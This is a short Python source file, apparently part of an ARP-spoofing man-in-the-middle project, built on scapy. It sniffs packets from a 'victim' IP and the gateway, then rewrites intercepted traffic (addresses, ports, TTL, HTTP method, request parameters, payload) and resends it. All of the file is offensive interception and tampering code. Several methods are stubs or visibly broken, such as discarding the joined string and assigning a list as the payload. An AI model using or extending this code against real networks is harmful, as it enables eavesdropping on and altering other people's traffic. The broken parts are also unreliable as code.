from scapy.all import *
from scapy.layers.inet import IP, TCP

from arpspoofer import ArpSpoofer
class sniffer:

    def __init__(self):
        self.spoofer = ArpSpoofer()

    def victim_filter(self, packet):
        return packet[IP].src == self.spoofer.targetIP

    def recive_victim(self):
        p = sniff(lfilter= self.victim_filter)

    def router_filter(self, packet):
        return packet[IP].src == self.spoofer.gatewayIP

    def recive_router(self):
        p = sniff(lfilter= self.router_filter)

    def send_packet(self, packet):
        send(packet)

    def edit_packet(self, packet, src_ip, dst_ip, req_type, req_params, headers, data, src_port, dst_port, ttl):
        if src_ip != None:
            packet[IP].src = src_ip
        if dst_ip != None:
            packet[IP].dst = dst_ip
        if req_type != None:
            packet[Raw].replace("GET", req_type) or packet[Raw].replace("HTTP /1.1", req_type) or packet[Raw].replace("POST", req_type)
        if data != None:
            packet[Raw] = data
        if req_params != None:
            self.change_req_params(req_params, packet)
        if headers!= None:
            self.change_headers(headers)
        if src_port != None:
            packet[TCP].sport = src_port
        if dst_port != None:
            packet[TCP].dport = dst_port
        if ttl != None:
            packet[IP].ttl = ttl

    def change_req_params(self,req_params, packet):
        txt = packet[Raw].load
        list = txt.split()
        list[1] = req_params
        " ".join(list)
        packet[Raw].load = list

    def change_headers(self, headers):
        pass #gets header dict




